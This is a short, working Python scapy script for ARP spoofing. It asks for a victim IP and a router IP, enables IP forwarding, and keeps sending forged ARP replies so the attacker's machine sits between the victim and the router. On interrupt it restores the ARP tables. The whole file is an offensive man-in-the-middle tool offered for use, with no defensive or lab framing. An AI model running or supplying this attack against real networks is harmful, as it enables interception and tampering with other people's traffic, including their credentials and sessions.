import os
import time
import sys
from scapy.all import *

def getinfo():
	print("   Getting IPs   ")
	##interface = str(input("Interface:"))
	victimIP = str(input("Victim IP:"))
	routerIP = str(input("Router IP:"))
	return [victimIP,routerIP]

#fun to turn on the forwarding port until restart
def portforwarding(mode):
	if (mode == True):
		os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
	if (mode == False):
		os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')

		
#this fun will make everything normal after completing the attack
def reARP(victimIP,routerIP):
	victimMAC = getmacbyip(victimIP)
	routerMAC = getmacbyip(routerIP)
	
	##send ARP request to router as-if from victim to connect
	send(ARP(op=2,pdst=routerIP,hwdst=routerMAC,psrc=victimIP,hwsrc=victimMAC))
	
	##send ARP request to victim as-if from router to connect
	send(ARP(op=2,pdst=victimIP,hwdst=victimMAC,psrc=routerIP,hwsrc=routerMAC))
	portforwarding(False)

#saying to each part that i am the other target
#so this fun put us inbetween
def attack(victimIP, victimMAC, routerIP, routerMAC):
	send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC),verbose=False)
	send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMAC),verbose=False)
	
	
#the main-function

info = getinfo()
victimIP = info[0]
victimMAC = getmacbyip(info[0])
routerIP = info[1]
routerMAC = getmacbyip(info[1])
packets_sent = 0
try:
	while True:
		portforwarding(True)
		attack(victimIP, victimMAC, routerIP, routerMAC)
		packets_sent += 2
		print("\r[+] Packets Sent: {}".format(packets_sent), end = "")
		time.sleep(1.5)
except KeyboardInterrupt:
	print("\n[-] Detected Ctrl + C..... Restoring the ARP Tables..... Be Patient")
	reARP(victimIP,routerIP)
















